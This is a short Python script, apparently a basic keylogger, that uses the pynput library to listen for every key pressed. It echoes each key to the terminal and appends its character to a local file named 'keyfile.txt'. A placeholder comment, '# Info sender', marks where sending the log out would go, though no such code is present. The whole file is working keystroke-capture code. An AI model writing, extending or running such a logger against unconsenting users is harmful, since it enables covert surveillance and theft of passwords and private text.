from pynput import keyboard

# Function called when a key is pressed
def keyPressed(key):
    # Display the key pressed in the terminal
    print(str(key))
    # open the keyfile.txt with mode "append"
    with open("keyfile.txt", "a") as logKey:
        try:
            # append the key char 
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
# Info sender

if __name__ == "__main__":
    # creating a listener for every key pressed
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    # Keeps the program running
    input()

